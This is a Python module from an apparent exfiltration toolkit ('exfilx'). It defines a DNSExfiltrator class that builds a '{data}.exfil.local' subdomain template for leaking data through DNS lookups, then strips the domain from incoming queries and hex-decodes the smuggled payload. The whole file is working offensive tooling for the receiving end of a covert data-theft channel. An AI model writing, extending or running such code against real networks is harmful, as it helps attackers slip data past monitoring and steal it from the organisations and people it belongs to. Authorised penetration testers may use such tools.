import logging
from .exfil_base import BaseExfiltrator

logger = logging.getLogger('exfilx')

class DNSExfiltrator(BaseExfiltrator):
    """Class for DNS-based data exfiltration"""

    def __init__(self, domain="exfil.local"):
        self.domain = domain

    def get_exfil_url(self):
        """Return the DNS exfiltration domain"""
        return f"{{data}}.{self.domain}"

    def process_data(self, data):
        """Process the exfiltrated data from DNS queries"""
        # Extract the subdomain part which contains the data
        if data.endswith(f".{self.domain}"):
            exfil_data = data[:-len(f".{self.domain}")]
            logger.info(f"Received exfiltrated data via DNS: {exfil_data}")

            # Decode the data if needed (e.g., from hex or base64)
            try:
                # This is a simple example - in a real scenario you might need more complex decoding
                decoded = bytes.fromhex(exfil_data).decode('utf-8')
                logger.info(f"Decoded data: {decoded}")
                return decoded
            except Exception as e:
                logger.error(f"Error decoding data: {str(e)}")
                return exfil_data

        return None
